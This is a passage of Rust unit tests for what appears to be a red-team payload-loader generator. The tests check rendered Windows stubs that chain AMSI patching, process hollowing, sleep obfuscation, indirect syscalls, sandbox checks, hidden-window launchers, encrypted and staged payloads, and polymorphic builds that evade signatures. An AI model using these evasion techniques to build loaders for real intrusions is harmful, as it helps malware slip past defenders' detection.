            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render")
    }

    fn render_debug(steps: Vec<StepPayload>) -> String {
        let params = StepsParams {
            steps,
            build_args: BTreeMap::new(),
            debug: true,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render")
    }

    #[test]
    fn a_sleep_hook_emits_the_runtime_and_the_proxy_block() {
        let params = StepsParams {
            steps: Vec::new(),
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let api = ApiResolutionConfig {
            mode: crate::engine::api_resolution::ApiResolutionMode::Proxy,
            hooks: crate::engine::api_resolution::HooksConfig {
                sleep: Some(crate::engine::api_resolution::SleepHookConfig {
                    min_ms: 1000,
                    max_ms: 600_000,
                }),
            },
            ..ApiResolutionConfig::default()
        };
        let syscalls = SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: crate::engine::syscalls::Resolver::HellsGate,
            ..Default::default()
        };
        let out =
            render_builtin(&template(), &params, &strings(), &syscalls, &api).expect("render");

        assert!(out.contains("mod sleep_runtime {"), "runtime missing");
        assert!(out.contains("mod api_resolution {"), "proxies missing");
        assert!(
            out.contains("extern \"system\" fn proxy_0"),
            "the Sleep proxy missing"
        );
        assert!(
            out.contains("crate::sleep_runtime::ekko_sleep"),
            "the proxy does not call the shared runtime"
        );
        // The debug prelude uses `$` as macro syntax, so cut it before looking
        // for an unsubstituted placeholder.
        let source = out
            .split("// --- Debug instrumentation")
            .next()
            .unwrap_or(&out);
        assert!(
            !source.contains('$'),
            "an unsubstituted placeholder survived"
        );
    }

    #[test]
    fn a_delivery_build_emits_no_stub_marker() {
        let out = render(vec![execution_step(0)]);
        assert!(
            !out.contains("stub_marker"),
            "a non-debug build must not touch the marker: {out}"
        );
        assert!(
            !out.contains("STUB_MARKER"),
            "a non-debug build must not embed the marker: {out}"
        );
    }

    #[test]
    fn a_debug_build_prints_the_stub_marker() {
        let out = render_debug(vec![execution_step(0)]);
        assert!(
            out.contains("eprintln!(\"{stub_marker}\")"),
            "a debug build should print the marker: {out}"
        );
    }

    #[test]
    fn two_execution_steps_render_two_modules() {
        let out = render(vec![execution_step(0), execution_step(1)]);
        assert!(out.contains("mod step_0 {"), "step 0 module missing");
        assert!(out.contains("mod step_1 {"), "step 1 module missing");
        assert!(
            out.contains("include_bytes!(\"payload_0.bin\")"),
            "payload 0 not embedded"
        );
        assert!(
            out.contains("include_bytes!(\"payload_1.bin\")"),
            "payload 1 not embedded"
        );
        assert!(out.contains("fn run() -> Result<i32, String>"));
    }

    #[test]
    fn a_preparation_step_is_wrapped_with_a_run_adapter() {
        let out = render(vec![preparation_step(0)]);
        assert!(out.contains("mod step_0 {"), "prep module missing");
        assert!(out.contains("pub fn patch_amsi"), "prep fragment missing");
        assert!(
            out.contains("pub fn run() -> Result<bool, String>"),
            "prep adapter missing"
        );
        assert!(
            out.contains("Ok(false) => return Ok(0)"),
            "the abort arm is missing"
        );
    }

    #[test]
    fn a_bouncer_decoy_step_embeds_and_decrypts_its_asset() {
        let step = StepPayload {
            index: 0,
            label: "bouncer".to_string(),
            technique: serde_yml::from_str(
                "technique: bouncer\nparams:\n  on_reject:\n    action: decoy\n    decoy: { path: x, payload: p }\n  require: [{ hostname: h }]\n",
            )
            .expect("technique"),
            control: StepControl::default(),
            payload: Some(cipher("decoy_0.bin", "M")),
        };
        let out = render(vec![step]);
        assert!(out.contains("fn asset_bytes()"), "asset helper missing");
        assert!(
            out.contains("include_bytes!(\"decoy_0.bin\")"),
            "the decoy asset is not embedded"
        );
        assert!(
            out.contains("crate::decrypt_step(ASSET_ENC"),
            "the decoy is not decrypted through the shared helper"
        );
        assert!(
            out.contains("pub fn run() -> Result<bool, String>"),
            "the preparation adapter is missing"
        );
    }

    #[test]
    fn a_bouncer_without_a_decoy_still_compiles_the_helper() {
        let mut step = preparation_step(0);
        step.technique =
            serde_yml::from_str("technique: bouncer\nparams:\n  require: [{ hostname: h }]\n")
                .expect("technique");
        let out = render(vec![step]);
        assert!(out.contains("fn asset_bytes()"), "stub helper missing");
        assert!(out.contains("Err(String::new())"), "stub body missing");
        assert!(
            !out.contains("include_bytes!"),
            "a bouncer without a decoy must not embed an asset"
        );
    }

    #[test]
    fn a_drop_step_embeds_and_decrypts_its_asset() {
        let step = StepPayload {
            index: 0,
            label: "drop".to_string(),
            technique: serde_yml::from_str(
                "technique: drop\nparams: { path: \"TEST.docx\", payload: doc }\n",
            )
            .expect("technique"),
            control: StepControl::default(),
            payload: Some(cipher("asset_0.bin", "M")),
        };
        let out = render(vec![step]);
        assert!(out.contains("fn asset_bytes()"), "asset helper missing");
        assert!(
            out.contains("include_bytes!(\"asset_0.bin\")"),
            "the dropped asset is not embedded"
        );
        assert!(
            out.contains("pub fn run() -> Result<bool, String>"),
            "the preparation adapter is missing"
        );
    }

    #[test]
    fn a_living_off_the_land_step_renders_a_launcher() {
        let out = render(vec![lol_step(0)]);
        assert!(out.contains("pub fn run_exec()"), "launcher missing");
        assert!(out.contains("CreateProcessA"), "CreateProcessA missing");
        assert!(out.contains("CREATE_NO_WINDOW"), "hidden window missing");
        assert!(
            out.contains("step_0::run()"),
            "runner does not call the control step"
        );
    }

    #[test]
    fn a_sleep_step_is_a_single_inline_line() {
        let out = render(vec![execution_step(0), sleep_step(1, 250)]);
        assert!(
            out.contains("std::thread::sleep(std::time::Duration::from_millis(250));"),
            "inline sleep missing: {out}"
        );
        assert!(!out.contains("mod step_1 {"), "sleep must not get a module");
    }

    #[test]
    fn per_step_args_reach_the_runner_obfuscated() {
        let mut step = execution_step(0);
        if let Some(payload) = step.payload.as_mut() {
            payload.args = vec!["--first".to_string()];
            payload.args_override = true;
        }
        let out = render(vec![step]);
        assert!(out.contains("crate::set_stage_args("), "step args not set");
        assert!(
            !out.contains("--first"),
            "the arg leaked in cleartext: {out}"
        );
    }

    #[test]
    fn a_staged_payload_has_no_embedded_ciphertext() {
        let mut step = execution_step(0);
        if let Some(payload) = step.payload.as_mut() {
            payload.source = PayloadSource::Staged;
        }
        let out = render(vec![step]);
        assert!(
            out.contains("crate::take_staged_payload()"),
            "the staged slot is not read"
        );
        assert!(
            !out.contains("include_bytes!"),
            "a strictly staged payload must not embed ciphertext"
        );
    }

    #[test]
    fn a_staged_payload_with_a_fallback_embeds_the_copy_it_falls_back_to() {
        let mut step = execution_step(0);
        if let Some(payload) = step.payload.as_mut() {
            payload.source = PayloadSource::StagedWithFallback;
        }
        let out = render(vec![step]);
        assert!(
            out.contains("crate::take_staged_payload()"),
            "the staged slot is not read"
        );
        assert!(
            out.contains("include_bytes!(\"payload_0.bin\")"),
            "the embedded fallback is missing"
        );
        assert!(
            out.contains("decrypt_step(enc, &payload_nonce, &payload_key"),
            "the fallback is not decrypted through the rebuilt secrets"
        );
    }

    /// The runner must not hand the stage a cleartext nonce and key next to the
    /// ciphertext: both are rebuilt at run time under the configured strategy.
    #[test]
    fn the_payload_nonce_and_key_are_never_cleartext_in_the_runner() {
        let nonce_hex = hex::encode([0xAB; 24]);
        let key_hex = hex::encode([0xCD; 32]);
        let configs = [
            strings(),
            StringsConfig {
                strategy: StringStrategy::Stack,
                key: None,
            },
        ];

        for source in [PayloadSource::Embedded, PayloadSource::StagedWithFallback] {
            let mut step = execution_step(0);
            let payload = step.payload.as_mut().expect("execution payload");
            payload.nonce = [0xAB; 24];
            payload.key = [0xCD; 32];
            payload.source = source;
            let params = StepsParams {
                steps: vec![step],
                build_args: BTreeMap::new(),
                debug: false,
                windows_subsystem: false,
                kind: OutputKind::Exe,
                entry: DllEntry::Auto,
                console: ConsoleMode::Parent,
                poly_seed: None,
            };

            for config in &configs {
                let out = render_builtin(
                    &template(),
                    &params,
                    config,
                    &SyscallsConfig::default(),
                    &ApiResolutionConfig::default(),
                )
                .expect("render");
                assert!(
                    !out.contains(&nonce_hex),
                    "the nonce leaked in cleartext for {source:?} under {:?}: {out}",
                    config.strategy
                );
                assert!(
                    !out.contains(&key_hex),
                    "the key leaked in cleartext for {source:?} under {:?}: {out}",
                    config.strategy
                );
                assert!(
                    out.contains("let payload_nonce: String = "),
                    "the nonce is not rebuilt at run time for {source:?} under {:?}: {out}",
                    config.strategy
                );
                assert!(
                    out.contains("let payload_key: String = "),
                    "the key is not rebuilt at run time for {source:?} under {:?}: {out}",
                    config.strategy
                );
                assert!(
                    out.contains("decrypt_step(enc, &payload_nonce, &payload_key, 16)"),
                    "the runner does not pass the rebuilt secrets for {source:?} under {:?}: {out}",
                    config.strategy
                );
            }
        }
    }

    #[test]
    fn an_exe_build_renders_the_plain_entry() {
        let out = render(vec![execution_step(0)]);
        assert!(
            out.contains(crate::engine::entry::EXE_ENTRY),
            "the executable entry is missing"
        );
        assert!(!out.contains("DllMain"), "an executable exports nothing");
        assert!(!out.contains("dll_run_detached"));
    }

    #[test]
    fn a_dll_build_renders_the_exports_instead_of_main() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Dll,
            entry: DllEntry::Export("Start".to_string()),
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(
            source.contains("pub extern \"system\" fn Start("),
            "export missing"
        );
        assert!(source.contains("fn DllMain"), "DllMain missing");
        assert!(!source.contains("fn main("), "a DLL has no main");
        assert!(
            source.contains("fn run() -> Result<i32, String>"),
            "the chain must stay shared"
        );
        assert!(
            !source.contains("ENTRY_BLOCK"),
            "the placeholder must be substituted"
        );
    }

    /// A custom stub owns its entry point: without `$ENTRY_BLOCK$` nothing is
    /// injected, so the `fn main` it already declares is what runs.
    #[test]
    fn a_custom_stub_keeps_its_own_main() {
        let params = StepsParams {
            steps: Vec::new(),
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let rendered = render_custom(
            "fn main() {}\n",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(rendered.source.starts_with("fn main() {}"));
        assert!(!rendered.source.contains("dll_run_chain"));
    }

    #[test]
    fn a_missing_placeholder_is_an_error() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let result = render_builtin(
            "fn main() {}",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        );
        assert!(result.is_err());
    }

    #[test]
    fn a_custom_stub_ignoring_the_step_blocks_warns() {
        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let rendered = render_custom(
            "fn main() {}",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(
            rendered.warnings.iter().any(|w| w.contains("STEP_MODULES")),
            "expected a step-modules warning: {:?}",
            rendered.warnings
        );
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("STEP_RUNNER_BODY")),
            "expected a runner warning: {:?}",
            rendered.warnings
        );
    }

    #[test]
    fn a_staged_payload_failure_honours_on_fail_continue() {
        let mut step = execution_step(0);
        step.control = StepControl {
            on_success: StepOutcome::Continue,
            on_fail: StepFailure::Continue,
            delay_ms: 0,
        };
        if let Some(payload) = step.payload.as_mut() {
            payload.source = PayloadSource::Staged;
        }
        let out = render(vec![step]);
        assert!(
            out.contains("'step_0: {"),
            "the step block is not labeled: {out}"
        );
        assert!(
            out.contains("eprintln!(\"{e}\"); break 'step_0;"),
            "a staging failure does not break out of the step: {out}"
        );
    }

    #[test]
    fn a_decryption_failure_honours_on_fail_exit() {
        let mut step = execution_step(0);
        step.control = StepControl {
            on_success: StepOutcome::Continue,
            on_fail: StepFailure::Exit,
            delay_ms: 0,
        };
        let out = render(vec![step]);
        assert!(
            out.contains("Err(e) => { eprintln!(\"{e}\"); return Ok(0); }"),
            "a decryption failure does not take the exit action: {out}"
        );
    }

    #[test]
    fn a_payload_name_cannot_inject_a_source_line_into_the_step_comment() {
        let mut step = execution_step(0);
        step.label = "reflective_loading 'p\nfn injected() {}'".to_string();
        let out = render(vec![step]);
        assert!(
            out.contains("// --- step 0: reflective_loading 'p fn injected() {}' ---"),
            "the newline was not flattened into the comment: {out}"
        );
        assert!(
            !out.lines()
                .any(|line| line.trim_start().starts_with("fn injected()")),
            "the payload name produced a source line: {out}"
        );
    }

    /// The `nt_*` helpers are emitted whenever a technique needs them, in both
    /// syscall modes, so the custom-stub warning must not depend on `indirect`.
    #[test]
    fn a_custom_stub_ignoring_the_syscalls_block_warns_without_indirect_mode() {
        let mut step = execution_step(0);
        step.technique = serde_yml::from_str("technique: process_hollowing\n").expect("technique");
        let params = StepsParams {
            steps: vec![step],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let rendered = render_custom(
            "fn main() {}\n",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(
            rendered
                .warnings
                .iter()
                .any(|w| w.contains("SYSCALLS_BLOCK")),
            "expected a syscalls warning under mode: none: {:?}",
            rendered.warnings
        );
    }

    #[test]
    fn on_success_stop_returns_the_last_code() {
        let mut step = execution_step(0);
        step.control = StepControl {
            on_success: StepOutcome::Stop,
            on_fail: StepFailure::Continue,
            delay_ms: 5,
        };
        let out = render(vec![step]);
        assert!(out.contains("return Ok(last);"), "success stop missing");
        assert!(
            out.contains("eprintln!(\"{e}\");"),
            "failure continue missing"
        );
        assert!(
            out.contains("std::thread::sleep(std::time::Duration::from_millis(5));"),
            "delay missing"
        );
    }

    /// Compiles a preparation + execution + control stub to a PE. The real
    /// end-to-end check of the step renderer; marked `#[ignore]` because it
    /// needs `rustc` and the compiled dependencies (`cargo test --features live-tests -- --ignored`).
    #[test]
    #[cfg(feature = "live-tests")]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn a_step_stub_compiles_to_a_pe() {
        use crate::engine::compiler;

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("steps_test");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("payload_1.bin"), [0u8; 16]).unwrap();

        let mut prep = preparation_step(0);
        prep.technique =
            serde_yml::from_str("technique: anti_debug\nparams: { action: continue }\n")
                .expect("technique");
        let params = StepsParams {
            steps: vec![prep, execution_step(1), sleep_step(2, 1), lol_step(3)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join("main.rs");
        std::fs::write(&main_path, &source).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let out = dir.join("out.exe");
        compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
            .expect("compile");
        let bytes = std::fs::read(&out).expect("read");
        assert_eq!(&bytes[..2], b"MZ", "the stub must be a Windows PE");
    }

    /// Compiles a `kind: dll` stub and checks the artifact is a real library
    /// that exports the entry points. The end-to-end check of the DLL output;
    /// marked `#[ignore]` for the same reasons as the executable one.
    #[test]
    #[cfg(feature = "live-tests")]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn a_dll_stub_compiles_to_a_library_with_exports() {
        use crate::engine::compiler::{self, CompileOptions};

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("dll_test");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();

        let params = StepsParams {
            steps: vec![execution_step(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Dll,
            entry: DllEntry::Auto,
            console: ConsoleMode::Parent,
            poly_seed: None,
        };
        let source = render_builtin(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join("main.rs");
        std::fs::write(&main_path, &source).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let out = dir.join("loader.dll");
        compiler::compile_stub(
            &main_path,
            &out,
            &deps,
            CompileOptions {
                kind: OutputKind::Dll,
                ..CompileOptions::default()
            },
        )
        .expect("compile");

        let bytes = std::fs::read(&out).expect("read");
        let info = crate::engine::pe::parse(&bytes).expect("a valid PE");
        assert!(
            crate::engine::pe::is_dll(info.characteristics),
            "IMAGE_FILE_DLL must be set"
        );
        // The export names live in the export directory as plain ASCII.
        let text = String::from_utf8_lossy(&bytes);
        for export in ["DllMain", "JNI_OnLoad", "Run"] {
            assert!(text.contains(export), "missing export '{export}'");
        }
    }

    /// The polymorphism goal: two builds of the same plan must not share a
    /// `.text`. Compiles the same source with two source-level seeds (phase 2)
    /// and compares the code section. Marked `#[ignore]` for the same reasons as
    /// the other compile tests; the measured numbers live in
    /// `docs/design/polymorphism.md`.
    #[test]
    #[cfg(feature = "live-tests")]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn two_polymorphism_seeds_differ_in_the_text_section() {
        use crate::engine::compiler;
        use crate::engine::pe;
        use sha2::{Digest, Sha256};

        fn text_hash(path: &std::path::Path) -> String {
            let bytes = std::fs::read(path).expect("read");
            let info = pe::parse(&bytes).expect("a valid PE");
            let text = info
                .sections
                .iter()
                .find(|section| &section.name[..5] == b".text")
                .expect(".text section");
            let start = text.pointer_to_raw_data as usize;
            let end = start + text.size_of_raw_data as usize;
            hex::encode(Sha256::digest(&bytes[start..end]))
        }

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("poly_test");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("payload_0.bin"), [0u8; 16]).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let mut hashes = Vec::new();
        for (index, seed) in [0x1111_2222_3333_4444u64, 0xAAAA_BBBB_CCCC_DDDDu64]
            .into_iter()
            .enumerate()
        {
            let params = StepsParams {
                steps: vec![execution_step(0)],
                build_args: BTreeMap::new(),
                debug: false,
                windows_subsystem: false,
                kind: OutputKind::Exe,
                entry: DllEntry::Auto,
                console: ConsoleMode::Parent,
                poly_seed: Some(seed),
            };
            let source = render_builtin(
                &template(),
                &params,
                &strings(),
                &SyscallsConfig::default(),
                &ApiResolutionConfig::default(),
            )
            .expect("render");
            let main_path = dir.join(format!("main_{index}.rs"));
            std::fs::write(&main_path, &source).unwrap();
            let out = dir.join(format!("out_{index}.exe"));
            compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
                .expect("compile");
            hashes.push(text_hash(&out));
        }

        assert_ne!(
            hashes[0], hashes[1],
            "two polymorphism seeds produced the same .text"
        );
    }
}
